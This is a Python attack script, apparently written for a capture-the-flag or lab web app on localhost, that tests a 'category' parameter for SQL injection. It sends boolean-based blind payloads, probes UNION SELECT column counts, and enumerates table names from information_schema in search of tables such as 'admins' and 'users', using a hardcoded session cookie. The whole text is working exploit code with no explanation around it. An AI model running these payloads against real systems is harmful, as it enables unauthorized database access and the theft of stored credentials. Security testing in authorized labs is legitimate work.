import requests
import urllib.parse
import re

# Target configuration
target = "http://127.0.0.1:32780/"
session = requests.Session()
session.cookies.set('PHPSESSID', 'a619c2d322b0d2025997d9751eb6d09a')

print("[+] SQL Injection Testing on Category Parameter")
print(f"[+] Target: {target}")
print(f"[+] Session: PHPSESSID=a619c2d322b0d2025997d9751eb6d09a")

# Get baseline response
r_base = session.get(target + "?category=Nature")
baseline_len = len(r_base.text)
print(f"\n[+] Baseline response: {baseline_len} bytes")

# Test boolean-based blind injection
print("\n[+] Testing boolean-based blind injection:")

# True condition
payload_true = "Nature' AND '1'='1"
r_true = session.get(target + "?category=" + urllib.parse.quote(payload_true))
true_size = len(r_true.text)

# False condition
payload_false = "Nature' AND '1'='2"
r_false = session.get(target + "?category=" + urllib.parse.quote(payload_false))
false_size = len(r_false.text)

print(f"[+] True condition: {true_size} bytes")
print(f"[+] False condition: {false_size} bytes")

if true_size != false_size:
    print("[!] Boolean-based blind injection CONFIRMED - response sizes differ")
    blind_possible = True
else:
    print("[-] No difference in response sizes")
    blind_possible = False

# Test UNION-based injection
print("\n[+] Testing UNION-based injection:")

# Try different column counts
for cols in range(1, 6):
    union_payload = f"' UNION SELECT " + ",".join([str(i) for i in range(1, cols+1)]) + "#"
    r = session.get(target + "?category=" + urllib.parse.quote(union_payload))
    print(f"[+] Columns={cols}: {len(r.text)} bytes")
    
    if len(r.text) < baseline_len - 1000:
        print(f"[!] Significantly different response size detected!")
        print(f"[!] Response snippet:\n{r.text[:300]}")
        
# Try to extract table names
print("\n[+] Extracting table names:")
for i in range(5):
    payload = f"' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {i},1#"
    r = session.get(target + "?category=" + urllib.parse.quote(payload))
    print(f"[+] Table {i}: {len(r.text)} bytes")
    
    # Look for table names in response
    if len(r.text) < baseline_len:
        # Extract text content
        text = re.sub(r'<[^>]+>', ' ', r.text)
        words = re.findall(r'\b[a-z_]+\b', text)
        common_tables = ['posts', 'categories', 'admins', 'users']
        found_tables = [w for w in words if w in common_tables]
        if found_tables:
            print(f"[!] Found table: {found_tables}")

print("\n[+] Initial testing complete")
